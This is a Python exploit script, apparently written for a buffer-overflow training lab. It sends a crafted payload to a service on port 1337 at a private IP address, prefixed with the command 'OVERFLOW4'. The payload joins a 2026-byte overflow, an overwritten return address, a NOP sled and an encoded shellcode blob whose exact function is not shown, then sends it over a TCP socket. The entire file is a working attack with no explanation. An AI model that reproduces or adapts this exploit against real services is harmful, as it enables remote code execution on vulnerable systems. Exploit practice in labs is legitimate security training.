#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.10.42.175"
port = 1337

prefix = b"OVERFLOW4 "
offset = 2026
overflow = b"A" * offset
retn = b"\xbb\x11\x50\x62"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)

shellcode = b"\xda\xdf\xba\x9c\x06\x73\x1a\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x52\x31\x50\x17\x03\x50\x17\x83\x5c\x02\x91\xef\xa0\xe3\xd7\x10\x58\xf4\xb7\x99\xbd\xc5\xf7\xfe\xb6\x76\xc8\x75\x9a\x7a\xa3\xd8\x0e\x08\xc1\xf4\x21\xb9\x6c\x23\x0c\x3a\xdc\x17\x0f\xb8\x1f\x44\xef\x81\xef\x99\xee\xc6\x12\x53\xa2\x9f\x59\xc6\x52\xab\x14\xdb\xd9\xe7\xb9\x5b\x3e\xbf\xb8\x4a\x91\xcb\xe2\x4c\x10\x1f\x9f\xc4\x0a\x7c\x9a\x9f\xa1\xb6\x50\x1e\x63\x87\x99\x8d\x4a\x27\x68\xcf\x8b\x80\x93\xba\xe5\xf2\x2e\xbd\x32\x88\xf4\x48\xa0\x2a\x7e\xea\x0c\xca\x53\x6d\xc7\xc0\x18\xf9\x8f\xc4\x9f\x2e\xa4\xf1\x14\xd1\x6a\x70\x6e\xf6\xae\xd8\x34\x97\xf7\x84\x9b\xa8\xe7\x66\x43\x0d\x6c\x8a\x90\x3c\x2f\xc3\x55\x0d\xcf\x13\xf2\x06\xbc\x21\x5d\xbd\x2a\x0a\x16\x1b\xad\x6d\x0d\xdb\x21\x90\xae\x1c\x68\x57\xfa\x4c\x02\x7e\x83\x06\xd2\x7f\x56\x88\x82\x2f\x09\x69\x72\x90\xf9\x01\x98\x1f\x25\x31\xa3\xf5\x4e\xd8\x5e\x9e\x7a\x15\x10\xa3\x13\x27\xd0\x4a\xb8\xae\x36\x06\x50\xe7\xe1\xbf\xc9\xa2\x79\x21\x15\x79\x04\x61\x9d\x8e\xf9\x2c\x56\xfa\xe9\xd9\x96\xb1\x53\x4f\xa8\x6f\xfb\x13\x3b\xf4\xfb\x5a\x20\xa3\xac\x0b\x96\xba\x38\xa6\x81\x14\x5e\x3b\x57\x5e\xda\xe0\xa4\x61\xe3\x65\x90\x45\xf3\xb3\x19\xc2\xa7\x6b\x4c\x9c\x11\xca\x26\x6e\xcb\x84\x95\x38\x9b\x51\xd6\xfa\xdd\x5d\x33\x8d\x01\xef\xea\xc8\x3e\xc0\x7a\xdd\x47\x3c\x1b\x22\x92\x84\x3b\xc1\x36\xf1\xd3\x5c\xd3\xb8\xb9\x5e\x0e\xfe\xc7\xdc\xba\x7f\x3c\xfc\xcf\x7a\x78\xba\x3c\xf7\x11\x2f\x42\xa4\x12\x7a"


#postfix = b""

payload = prefix + overflow + retn + padding + shellcode     #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
